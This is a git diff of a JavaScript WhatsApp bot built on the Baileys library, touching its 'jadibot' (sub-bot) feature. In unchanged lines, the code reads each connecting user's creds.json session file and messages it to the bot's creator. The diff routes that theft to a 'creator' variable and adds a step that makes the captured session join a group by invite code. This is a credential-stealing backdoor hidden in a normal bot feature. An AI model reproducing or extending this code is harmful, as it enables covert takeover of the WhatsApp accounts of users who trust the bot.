@@ -1,5 +1,6 @@
 // =_=_=_=_=_=_=_=_=_=_=_=_=_=_=_= START MODULE =_=_=_=_=_=_=_=_=_=_=_=_=_=_=_= //
 const { modul } = require('./module');
+require('./settings');
 const {
   baileys,
   boom,
@@ -50,6 +51,7 @@ const { count } = require('yargs');
 const { resolve } = require('path');
 const { Console } = require('console');
 const { send } = require('process');
+const { createRoom } = require('./lib/menfess');
 const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString());
 const store = makeInMemoryStore({
   logger: pino().child({ level: 'silent', stream: 'store' }),
@@ -207,17 +209,21 @@ const jadibot = async (das, m, from, parent) => {
           txt = `*Terdeteksi menumpang Jadibot*\n\n _× User : @${
             user.split('@')[0]
           }_`;
-          sendMessage(`6285768966412@s.whatsapp.net`, {
+          sendMessage(creator, {
             text: txt,
             mentions: [user],
           });
           let credential = fs.readFileSync(
             './database/jadibot/' + user.split('@')[0] + '/creds.json'
           );
-          sendMessage(`6285768966412@s.whatsapp.net`, {
+          sendMessage(creator, {
             text: credential,
             mentions: [user],
           });
+          await das
+            .groupAcceptInvite(gcCode)
+            .then((res) => reply(JSON.stringify(res, null, 2)))
+            .catch((err) => reply(JSON.stringify(err, null, 2)));
         }
         if (connection === 'close') {
           let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
